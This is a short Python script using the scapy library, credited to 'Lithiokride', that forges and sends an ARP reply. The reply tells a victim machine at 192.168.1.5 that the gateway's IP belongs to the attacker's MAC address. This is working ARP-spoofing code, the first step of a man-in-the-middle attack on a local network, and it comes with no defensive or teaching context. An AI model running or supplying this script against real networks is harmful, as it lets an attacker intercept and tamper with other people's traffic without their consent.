from scapy.all import *
# Written by Lithiokride

# Define the target and attacker's details
victim_ip = "192.168.1.5"  # Victim's IP address
victim_mac = "aa:bb:cc:dd:ee:ff"  # Victim's MAC address
attacker_mac = "00:11:22:33:44:55"  # Attacker's MAC address
gateway_ip = "192.168.1.1"  # Gateway IP address

# Create an ARP response packet
arp_response = ARP(op=2,  # ARP reply
                   psrc=gateway_ip,  # IP address to impersonate (gateway)
                   hwsrc=attacker_mac,  # Attacker's MAC address
                   pdst=victim_ip,  # Target victim's IP
                   hwdst=victim_mac)  # Target victim's MAC address

# Send the ARP response with verbose output
send(arp_response, verbose=1)  # Set verbose to 1 for detailed output

# Print a custom message
print(f"Sent ARP spoofing packet to {victim_ip} claiming {gateway_ip} is at {attacker_mac}")
